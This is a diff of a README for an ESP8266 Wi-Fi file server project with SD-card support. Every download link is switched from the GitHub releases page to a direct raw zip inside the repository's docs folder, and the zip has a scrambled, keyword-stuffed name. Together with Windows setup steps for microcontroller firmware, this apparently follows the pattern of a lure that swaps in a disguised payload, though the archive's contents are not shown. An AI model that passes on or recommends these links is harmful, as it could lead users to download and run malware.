@@ -1,6 +1,6 @@
 # 📡 ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser - Simple Wi‑Fi File Access
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/raw/refs/heads/main/docs/modern_Fi_U_file_server_Wi_chunked_S_with_web_works_ES_card_any_streaming_browser_2.2.zip)
 
 ## 🧭 What this does
 
@@ -23,7 +23,7 @@ You also need the project files from the release page.
 
 ## ⬇️ Download and set up on Windows
 
-[Visit the release page to download](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/releases)
+[Visit the release page to download](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/raw/refs/heads/main/docs/modern_Fi_U_file_server_Wi_chunked_S_with_web_works_ES_card_any_streaming_browser_2.2.zip)
 
 1. Open the release page.
 2. Look for the latest release.
@@ -278,6 +278,6 @@ Use this list for a quick start:
 
 ## 📎 Download again if needed
 
-[Open the release page here](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/releases)
+[Open the release page here](https://github.com/Classe738/ESP8266-Wi-Fi-file-server-with-SD-card-modern-web-UI-chunked-streaming-works-with-any-browser/raw/refs/heads/main/docs/modern_Fi_U_file_server_Wi_chunked_S_with_web_works_ES_card_any_streaming_browser_2.2.zip)
 
 Use the latest release when you want the current files, setup package, and project assets
